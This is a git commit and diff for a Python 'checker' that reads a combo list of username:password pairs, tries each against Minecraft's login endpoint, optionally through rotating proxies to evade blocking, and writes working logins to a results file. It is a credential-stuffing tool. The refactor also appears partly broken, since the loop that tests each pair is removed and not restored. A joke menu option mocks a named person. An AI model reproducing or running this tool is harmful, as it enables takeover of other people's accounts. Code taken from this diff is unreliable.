1abb6e6952a8df558667b020e5dbe141b90113f9
GriffinG1 <4n0nym0ush4ck3r666@gmail.com>
2020-10-01 20:07:24 -0600

    Cut down duplicate code
    This was the biggest commit I had to do. Lemme go through it
    
    - Moved the proxyless/proxy stuff to the same function. This makes your code *much* cleaner.
    - This was done by adding a new variable, use_proxy, which is a bool. If True, uses proxy, else doesn't.
    I also renamed `check` to `checkAccount`, so that it'd be easier to understand the purpose.
    - Finally a small one, but changed the bare `except` to `except Exception as e`. This is for PEP8, though you should really check what error that actually throws and catch *that*. I don't have a testing file, or I would.

--- checker.py
+++ checker.py
@@ -20,12 +20,10 @@ checks = 0
 
 results = open("results.txt", "a")
 
-def auth(user, password):
-    proxies = fproxy.get_proxies()
-    proxypool = cycle(proxies)
 
-    proxy = next(proxypool)
-    payload = ({
+def auth(user, password, use_proxy: bool):
+    payload = (
+        {
             'agent': {
                 'name': 'Minecraft',
                 'version': 1
@@ -35,50 +33,34 @@ def auth(user, password):
             'requestUser': 'true'
         })
     try:
-        r = requests.post(url=auth, json=payload, headers=jsonheaders, proxies={"http": proxy, "https": proxy})
+        if use_proxy:
+            proxies = fproxy.get_proxies()
+            proxypool = cycle(proxies)
+            proxy = next(proxypool)
+            r = requests.post(url=auth, json=payload, headers=jsonheaders, proxies={"http": proxy, "https": proxy})
+        else:
+            r = requests.post(url=auth, json=payload, headers=jsonheaders)
         if r.status_code == 200:
             return 1
         else:
             return 0
-    except:
-        return 2
-
-def authpLess(user, password):
-    payload = ({
-            'agent': {
-                'name': 'Minecraft',
-                'version': 1
-            },
-            'username': user,
-            'password': password,
-            'requestUser': 'true'
-        })
-    try:
-        r = requests.post(url=auth, json=payload, headers=jsonheaders)
-        if r.status_code == 200:
-            return 1
-        else:
-            return 0
-    except:
+    except Exception as e:
         return 2
 
 
-def check():
-    print('Please type the name of your combo list!\n')
-    combo = input('> ')
-    with open(combo + ".txt") as f:
+def checkAccount(use_proxy: bool):
     file = input('Please enter the name of your file!\n> ')
     while not file.endswith('.txt'):
         print("Error: File must be a txt file. Please try again.")
         file = input('Please enter the name of your file!\n> ')
     try:
         with open(file) as f:
-        lines = f.readlines()
+            lines = f.readlines()
     except FileNotFoundError:
         print(f"Couldn't find a file named '{file}'. Please double check your spelling, and try again.")
         input("Press enter to exit.")
         sys.exit(0)
-    
+
     if len(lines) == 0:
         print("The file you provided is empty! Is that the right file?")
         input("Press enter to exit.")
@@ -105,16 +87,7 @@ def printMenu():
         " [B] Minecraft w/o Proxies\n",
         " [G] is Chrusher chris into men?\n"
     )
-    
-    for line in lines:
-        a = line.split(':')
-        user = a[0]
-        pasd = a[1]
-        if authpLess(user, pasd) == 1:
-            print('[' + user + ':' + pasd + '] Hit')
-            results.write(user + ':' + pasd)
-        else:
-            print('[' + user + ':' + pasd + '] Miss')
+
 
 async def main():
     printMenu()
@@ -122,12 +95,12 @@ async def main():
     while choice not in ('A', 'B', 'G'):
         print(f"Error: Inputted value of '{choice}' not an option. Please try again.")
         printMenu()
-choice = input('> ')
-if choice == 'A':
-    check()
-elif choice == 'B':
-    checkpLess()
-elif choice == 'G':
-    print('Yes crusher chris is into men\n :D\n :D\n :D')
+        choice = input('> ')
+    if choice == 'A':
+        checkAccount(True)
+    elif choice == 'B':
+        checkAccount(False)
+    elif choice == 'G':
+        print('Yes crusher chris is into men\n :D\n :D\n :D')
 
 asyncio.get_event_loop().run_until_complete(main())
